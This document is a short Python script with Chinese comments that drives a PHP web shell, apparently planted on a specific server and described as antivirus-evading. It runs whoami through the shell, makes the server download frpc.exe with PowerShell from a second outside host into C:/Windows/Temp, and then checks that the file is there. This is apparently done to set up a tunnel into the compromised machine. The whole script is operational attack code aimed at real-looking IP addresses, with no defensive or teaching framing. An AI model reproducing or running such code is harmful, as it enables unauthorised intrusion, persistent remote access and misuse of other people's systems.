#!/usr/bin/env python3
"""推送 frpc.exe 到 81.70 (通过 yy.php 免杀shell)
165 起 http.server 提供 frpc.exe, 81.70 用 powershell 下载
"""
import urllib.request, urllib.parse, time

SHELL = "http://81.70.245.25/yy.php"
def cmd(c):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=20)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

# 1. 确认能执行
print("1. whoami:", cmd("system('whoami');").strip()[-30:], flush=True)
# 2. 下载 frpc.exe (用 powershell, 165:9124 提供文件)
#    powershell Invoke-WebRequest 或 certutil
print("2. powershell下载 frpc.exe...", flush=True)
dl = "powershell -Command \"Invoke-WebRequest -Uri 'http://165.99.43.145:9124/frpc.exe' -OutFile 'C:/Windows/Temp/frpc.exe'\""
r = cmd(f"system('{dl}');")
print("   下载结果:", r.strip()[-80:], flush=True)
time.sleep(1)
# 3. 验证文件存在
print("3. 验证:", cmd("system('dir C:/Windows/Temp/frpc.exe');").strip()[-80:], flush=True)
